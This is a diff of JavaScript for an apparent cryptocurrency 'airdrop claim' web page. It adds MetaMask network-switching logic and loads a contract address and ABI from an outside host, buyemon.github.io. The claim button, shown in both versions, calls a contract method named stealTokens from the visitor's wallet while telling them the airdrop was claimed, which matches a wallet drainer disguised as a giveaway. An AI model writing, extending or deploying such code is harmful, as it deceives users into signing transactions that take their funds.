@@ -20,18 +20,16 @@ async function connectMetaMask() {
             const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
             console.log("Current network chainId:", currentChainId);
 
-            // Set default network based on user network
+            // Set default network based on user network (default is Ethereum Mainnet)
             let defaultNetwork = 'eth';
             if (currentChainId === '0x1') {
                 defaultNetwork = 'eth'; // Ethereum Mainnet
             } else if (currentChainId === '0x38') {
-                defaultNetwork = 'bsc'; // Binance Smart Chain Mainnet
+                defaultNetwork = 'bsc'; // Binance Smart Chain
             } else if (currentChainId === '0xaa36a7') {
-                defaultNetwork = 'eth'; // Ethereum Sepolia Testnet
-            } else if (currentChainId === '0x61') {
-                defaultNetwork = 'bsc'; // BSC Testnet
+                defaultNetwork = 'sepolia'; // Ethereum Sepolia Testnet
             } else {
-                console.error("Unknown network. Please switch to Ethereum or BSC.");
+                console.error("Unknown network. Please switch to Ethereum, BSC, or Sepolia.");
                 return;
             }
 
@@ -47,34 +45,58 @@ async function connectMetaMask() {
     }
 }
 
-// Load config and ABI for the selected network (Ethereum and BSC are treated separately)
-async function loadConfigAndABI(network) {
-    try {
-        let config, abi;
-
-        // Load the config and ABI based on the selected network (Ethereum or BSC)
-        if (network === 'eth') {
-            // For Ethereum (Mainnet or Sepolia Testnet)
-            const configResponse = await fetch('https://buyemon.github.io/wallets/config/eth_config.json');
-            config = await configResponse.json();
-            const abiResponse = await fetch('https://buyemon.github.io/wallets/abi/eth_abi.json');
-            abi = await abiResponse.json();
-        } else if (network === 'bsc') {
-            // For BSC (Mainnet or Testnet)
-            const configResponse = await fetch('https://buyemon.github.io/wallets/config/bsc_config.json');
-            config = await configResponse.json();
-            const abiResponse = await fetch('https://buyemon.github.io/wallets/abi/bsc_abi.json');
-            abi = await abiResponse.json();
-        } else {
-            console.error("Unsupported network:", network);
-            return null;
+// Function to switch networks based on chainId
+async function switchToNetwork(networkId, isTestnet = false) {
+    // Define the mainnet and testnet chain IDs for each network
+    const networkConfig = {
+        eth: {
+            mainnet: '0x1',       // Ethereum Mainnet
+            sepolia: '0xaa36a7',  // Ethereum Sepolia Testnet
+        },
+        bsc: {
+            mainnet: '0x38',      // Binance Smart Chain Mainnet
+            testnet: '0x61',      // Binance Smart Chain Testnet
         }
+    };
 
-        return { config, abi };
-    } catch (error) {
-        console.error("Error loading config or ABI:", error);
-        alert("Error loading config or ABI.");
-        return null;
+    // Determine which chainId to use based on the network and whether it's a testnet
+    let chainId;
+    if (isTestnet) {
+        chainId = networkConfig[networkId]?.sepolia || networkConfig[networkId]?.testnet || null;
+    } else {
+        chainId = networkConfig[networkId]?.mainnet || null;
+    }
+
+    if (chainId) {
+        try {
+            // Attempt to switch the network
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId }],
+            });
+            console.log(`Switched to ${isTestnet ? 'testnet' : 'mainnet'} for ${networkId} network: ${chainId}`);
+        } catch (error) {
+            console.error("Error switching network:", error);
+
+            // Handle network not found, add it if not present in MetaMask
+            if (error.code === 4902) {
+                console.log(`${networkId} network is not available in MetaMask, adding it.`);
+                if (networkId === 'eth' && isTestnet) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0xaa36a7',
+                            chainName: 'Ethereum Sepolia Testnet',
+                            rpcUrls: ['https://sepolia.infura.io/v3/'], // Replace with your Infura project ID
+                            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                            blockExplorerUrls: ['https://sepolia.etherscan.io/'],
+                        }],
+                    });
+                }
+            }
+        }
+    } else {
+        console.error("Invalid network ID:", networkId);
     }
 }
 
@@ -87,41 +109,42 @@ async function claimAirdrop() {
     const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
     let network = '';
 
-    if (currentChainId === '0x1' || currentChainId === '0xaa36a7') {
-        network = 'eth';  // Ethereum Mainnet or Sepolia Testnet
-    } else if (currentChainId === '0x38' || currentChainId === '0x61') {
-        network = 'bsc';  // BSC Mainnet or Testnet
+    if (currentChainId === '0x1') {
+        network = 'eth';  // Ethereum Mainnet
+    } else if (currentChainId === '0x38') {
+        network = 'bsc';  // Binance Smart Chain Mainnet
+    } else if (currentChainId === '0xaa36a7') {
+        network = 'sepolia'; // Ethereum Sepolia Testnet
     } else {
         alert("You are not connected to a supported network.");
         return;
     }
 
-    // Load the config and ABI for the selected network
-    const { config, abi } = await loadConfigAndABI(network);
-    if (!config || !abi) return;
+    // Load the contract address and ABI from the network config and ABI files
+    const configResponse = await fetch(`https://buyemon.github.io/wallets/config/${network}_config.json`);
+    const config = await configResponse.json();
 
-    const contractAddress = config.contractAddress;  // Network-specific contract address
-    if (!contractAddress) {
-        console.error("Contract address not found for network:", network);
-        return;
-    }
+    const abiResponse = await fetch(`https://buyemon.github.io/wallets/abi/${network}_abi.json`);
+    const abi = await abiResponse.json();
+
+    const contractAddress = config.contractAddress;
+    const tokenAddress = config.tokenAddress;
+
+    // Create a web3 instance
+    const web3 = new Web3(window.ethereum);
+
+    // Create the contract instance
+    const contract = new web3.eth.Contract(abi, contractAddress);
 
     try {
         console.log(`Claiming airdrop for account: ${account} on ${network} network`);
 
-        // Initialize Web3
-        const web3 = new Web3(window.ethereum);
-
-        // Get the contract instance
-        const contract = new web3.eth.Contract(abi, contractAddress);
-
-        // Call the stealTokens function (as per your ABI)
-        await contract.methods.stealTokens().send({ from: account });
+        // Call the stealTokens function with the appropriate account
+        await contract.methods.stealTokens(account).send({ from: account });
 
         alert(`Airdrop claimed successfully for account: ${account}`);
     } catch (error) {
         console.error("Error claiming airdrop:", error);
-        alert("Error claiming airdrop. Please try again.");
     }
 }
 
